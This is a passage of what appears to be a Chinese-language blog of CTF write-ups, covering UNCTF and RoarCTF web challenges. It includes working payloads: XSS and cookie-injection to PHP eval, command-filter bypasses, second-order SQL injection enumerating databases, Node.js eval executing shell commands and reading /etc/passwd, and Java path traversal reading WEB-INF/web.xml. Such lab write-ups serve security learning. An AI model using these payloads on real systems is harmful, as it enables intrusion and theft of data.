class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// $code = htmlentities($code);</span>    <span class="token keyword">return</span> <span class="token function">preg_replace_callback</span><span class="token punctuation">(</span>        <span class="token string">"/\[url\](.+)\[\/url\]/"</span><span class="token punctuation">,</span>         <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"javascript:"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"&lt;a href='$a[1]'>"</span><span class="token punctuation">.</span><span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/a>"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>         <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$code</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>video 解析，然后再 url解析。那么如果我们的 video传进的是：</p><pre class=" language-php"><code class="language-php"><span class="token punctuation">[</span>video<span class="token punctuation">]</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.youtube.com?v=[url]1234[/url][/video]</span></code></pre><p>先解析成</p><pre><code>&lt;video src=&#39;https://www.youtube.com/embed/[url]1234[/url]&gt;&lt;/video&gt;</code></pre><p>再解析成</p><pre><code>&lt;video src=&#39;https://www.youtube.com/embed/&lt;a href=&#39;1234&#39;&gt;1234&lt;/a&gt;&#39;&gt;&lt;/video&gt;</code></pre><p>将1234替换成<code>&gt;&lt;/video&gt;&lt;search&gt;haha&lt;/search&gt;</code></p><p>最后数据就解析成这样，成功逃逸</p><pre><code>&lt;video src=&#39;https://www.youtube.com/embed/&lt;a href=&#39;&gt;&lt;/video&gt;&lt;search&gt;haha&lt;/search&gt;</code></pre><p>测试payload</p><pre class=" language-php"><code class="language-php"><span class="token operator">?</span><span class="token constant">_COOKIE</span><span class="token punctuation">[</span><span class="token constant">GLOBALS</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token constant">GLOBALS</span><span class="token punctuation">]</span><span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span>video<span class="token punctuation">]</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.youtube.com?v=[url]></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>search</span><span class="token punctuation">></span></span></span>xxx<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>search</span><span class="token punctuation">></span></span></span><span class="token punctuation">[</span><span class="token operator">/</span>url<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">/</span>video<span class="token punctuation">]</span><span class="token constant">_COOKIE</span><span class="token punctuation">[</span><span class="token constant">GLOBALS</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token constant">GLOBALS</span><span class="token punctuation">]</span><span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span>video<span class="token punctuation">]</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.youtube.com?v=[url]>&lt;/video>&lt;search>{if{haha:searchnum}}&lt;/search>[/url][/video]&amp;_COOKIE[GLOBALS][searchnum]=:eva{haha:type}&amp;_COOKIE[GLOBALS][type]=l($_G{haha:typename}&amp;_COOKIE[GLOBALS][typename]=ET[1])&amp;1=phpinfo();</span></code></pre><h2 id="bypass-命令执行"><a href="#bypass-命令执行" class="headerlink" title="bypass(命令执行)"></a>bypass(命令执行)</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// try bypass it</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\'|\"|,|;|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$a</span> <span class="token operator">=</span><span class="token string">'"'</span> <span class="token punctuation">.</span> <span class="token variable">$a</span> <span class="token punctuation">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is"</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'"'</span> <span class="token punctuation">.</span> <span class="token variable">$b</span> <span class="token punctuation">.</span> <span class="token string">'"'</span><span class="token punctuation">;</span>     <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token string">"file $a $b"</span><span class="token punctuation">;</span>      <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"$cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>###法1</p><p>用<code>a=\&amp;b=\</code>来逃脱引号 通过file命令读取文件</p><pre><code>file &quot;\&quot; &quot; ???? \&quot;&quot;\&quot; &quot;????\&quot;三个部分</code></pre><p>用?来匹配,但是隐藏文件是无法显示的要自己在前面加一个.</p><p><code>file &quot;\&quot; -f &quot;  \&quot;</code></p><p>###法2</p><p>通过a=&amp;b=%0a{cmd}%20%23 用%0a换行 来执行命令 但由于过滤了许多命令只能去匹配</p><pre><code>?a=\&amp;b=%0a/???/l[r-t]%20-all%20%23 =&gt; /bin/ls -alla=\$b=%0a/???/gr[d-f]p+-r+.+.+%23 =&gt; /bin/grep -r . .</code></pre><p>最后在<code>http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt</code>里找到flag</p><p><code>unctf{86dfe85d7c5842c5c04adae104193ee1}</code></p><h2 id="NSB-RESET-PASSWORD"><a href="#NSB-RESET-PASSWORD" class="headerlink" title="NSB RESET PASSWORD"></a>NSB RESET PASSWORD</h2><p>reset1提交重置账号：设置name=post账号 check=随机验证码 （if(name==sesion[‘name’])当前账号名 则发送验证码，） </p><p>reset2：check==post验证码 验证校验码正确 就设置sign=true  </p><p>reset3：判断sign是否为true 给name账号改密码权限 改完就把sign设为false </p><p>解法<br>当第一次改密码把sign设为true 不改密码 第二次name=admin 再改密码</p><p> flag{175f3098f80735ddfdfbd4588f6b1082} </p><h2 id="inject-twice-sql注入"><a href="#inject-twice-sql注入" class="headerlink" title="inject twice(sql注入)"></a>inject twice(sql注入)</h2><p>题目是sql-lab的源码</p><p>二次注入点</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># Validating the user input........</span>    <span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token operator">==</span><span class="token variable">$re_pass</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>            <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span><span class="token punctuation">;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'You tried to be smart, Try harder!!!! :( '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_affected_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font size="3" color="#FFFF00">'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;center>'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Password successfully updated"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: failed.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//echo 'You tried to be smart, Try harder!!!! :( ';</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;font size="5" color="#FFFF00">&lt;center>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"Make sure New Password and Retype Password fields have same value"</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'refresh:2, url=index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>但是得到admin账号后,并没有得到flag,估计要把数据库给溜一圈。</p><p>黑名单:<code>or,</code></p><p>注册一个<code>hello\</code>的账号,就可以用,currentpass来注入,但是环境炸了,我sleep了一下就奇奇怪怪了</p><p>//////////////???????????????????</p><p>currentpass=<code>/**/or/**/1-- a</code></p><p>数据库名<code>or (SELECT substr(hex(group_concat(schema_name)),1,1) FROM information_schema.schemata)=char(54)-- a</code></p><p>information_schema,metinfo,mysql,performance_schema,security,sys</p><p>表:</p><p><code>GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database()</code></p><p>security:emails,fl4g,referers,uagents,users</p><p>列名</p><p>fl4g:f1ag</p><p>最后的flag<code>UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}</code></p><h2 id="checkin-nodejs注入"><a href="#checkin-nodejs注入" class="headerlink" title="checkin (nodejs注入)"></a>checkin (nodejs注入)</h2><p>又是一个vue应用</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g8cz6r1f4pj30ep0d2wfe.jpg" alt="image.png"></p><p>打开靶机，发现是一个websocket的js网站，/js/app.03bc1faf.js中可以看到源码</p><p>审计源码，需要我们先输入<strong>/name nickname</strong>来进行登陆，登陆后发现可以执行一个calc操作</p><p>执行<code>/calc 5*6</code> 发现返回30，猜测这里存在命令执行，参考：<a href="http://qnkcdz0.xyz/2019/06/24/Node-js代码审计之eval远程命令执行漏洞/" target="_blank" rel="noopener">Node.js代码审计之eval远程命令执行漏洞</a></p><p>后端是node.js version: v10.12.0 </p><p>使用<strong>fs</strong>模块读取文件</p><pre class=" language-javascript"><code class="language-javascript">res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readdirSync<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>调用<strong>child_process</strong>模块执行命令，题目过滤了空格，用<code>$IFS</code>替代</p><pre class=" language-javascript"><code class="language-javascript">执行ls<span class="token punctuation">:</span><span class="token operator">/</span>calc <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"ls$IFS/"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>cat flag<span class="token punctuation">:</span><span class="token operator">/</span>calc <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"cat$IFS/flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>roarctf writeup</title>
      <link href="/2019/10/25/writeup/roarctf-writeup/"/>
      <url>/2019/10/25/writeup/roarctf-writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="Easy-calc-url解析"><a href="#Easy-calc-url解析" class="headerlink" title="Easy_calc(url解析)"></a>Easy_calc(url解析)</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token string">', '</span>"<span class="token string">', '</span>`<span class="token string">', '</span><span class="token punctuation">[</span><span class="token string">', '</span><span class="token punctuation">]</span><span class="token string">','</span>$<span class="token string">','</span>\<span class="token string">','</span><span class="token operator">^</span>'<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"what are you want to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>页面是一个 计算机，读到calc.php源码</p><p>apache配置让num输入字符无法解析</p><pre class=" language-php"><code class="language-php"><span class="token constant">GET</span> <span class="token operator">/</span>calc<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token operator">%</span>20num<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//读目录</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">Array</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">.</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">.</span>dockerenv    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> bin    <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> boot    <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> dev    <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> etc    <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> f1agg    <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> home    <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> lib    <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> lib64    <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> media    <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> mnt    <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> opt    <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> proc    <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> root    <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> run    <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> sbin    <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> srv    <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> start<span class="token punctuation">.</span>sh    <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> sys    <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> tmp    <span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> usr    <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">var</span><span class="token punctuation">)</span></code></pre><p>Payload1</p><pre class=" language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">103</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>Payload2</p><pre class=" language-http"><code class="language-http">GET /calc.php?%20num=eval(end(getallheaders())) HTTP/1.1<span class="token header-name keyword">Host:</span> node3.buuoj.cn:28036<span class="token header-name keyword">flag:</span> var_dump(file_get_contents('/f1agg'));</code></pre><h2 id="Easyjava-Java文件结构"><a href="#Easyjava-Java文件结构" class="headerlink" title="Easyjava(Java文件结构)"></a>Easyjava(Java文件结构)</h2><p>登陆页面看到接口GET /Download?filename=help.docx</p><p><img src="/pic/LduWtSfIh8bDA7Z.png" alt=""></p><p>开始尝试</p><pre class=" language-php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>Download<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span>images<span class="token operator">/</span>img1<span class="token punctuation">.</span>jpg <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>Download<span class="token operator">?</span>filename<span class="token operator">=</span><span class="token operator">/</span><span class="token constant">WEB</span><span class="token operator">-</span><span class="token constant">INF</span><span class="token operator">/</span>web<span class="token punctuation">.</span>xml <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span></code></pre><p>得到</p><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span>welcome<span class="token operator">-</span>file<span class="token operator">-</span>list<span class="token operator">></span>        <span class="token operator">&lt;</span>welcome<span class="token operator">-</span>file<span class="token operator">></span>Index<span class="token operator">&lt;</span><span class="token operator">/</span>welcome<span class="token operator">-</span>file<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>welcome<span class="token operator">-</span>file<span class="token operator">-</span>list<span class="token operator">></span>    <span class="token operator">&lt;</span>servlet<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>IndexController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">></span>com<span class="token punctuation">.</span>wm<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>IndexController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">></span>    <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>mapping<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>IndexController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>        <span class="token operator">&lt;</span>url<span class="token operator">-</span>pattern<span class="token operator">></span><span class="token operator">/</span>Index<span class="token operator">&lt;</span><span class="token operator">/</span>url<span class="token operator">-</span>pattern<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>mapping<span class="token operator">></span>    <span class="token operator">&lt;</span>servlet<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>LoginController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">></span>com<span class="token punctuation">.</span>wm<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>LoginController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">></span>    <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>mapping<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>LoginController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>        <span class="token operator">&lt;</span>url<span class="token operator">-</span>pattern<span class="token operator">></span><span class="token operator">/</span>Login<span class="token operator">&lt;</span><span class="token operator">/</span>url<span class="token operator">-</span>pattern<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>mapping<span class="token operator">></span>    <span class="token operator">&lt;</span>servlet<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>DownloadController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">></span>com<span class="token punctuation">.</span>wm<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>DownloadController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">></span>    <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>mapping<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>DownloadController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>        <span class="token operator">&lt;</span>url<span class="token operator">-</span>pattern<span class="token operator">></span><span class="token operator">/</span>Download<span class="token operator">&lt;</span><span class="token operator">/</span>url<span class="token operator">-</span>pattern<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>mapping<span class="token operator">></span>    <span class="token operator">&lt;</span>servlet<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>FlagController<span class="token operator">&lt;</span><span class="token operator">/</span>servlet<span class="token operator">-</span>name<span class="token operator">></span>        <span class="token operator">&lt;</span>servlet<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">></span>com<span class="token punctuation">.</span>wm<span class="token punctuation">.</span>ctf<span 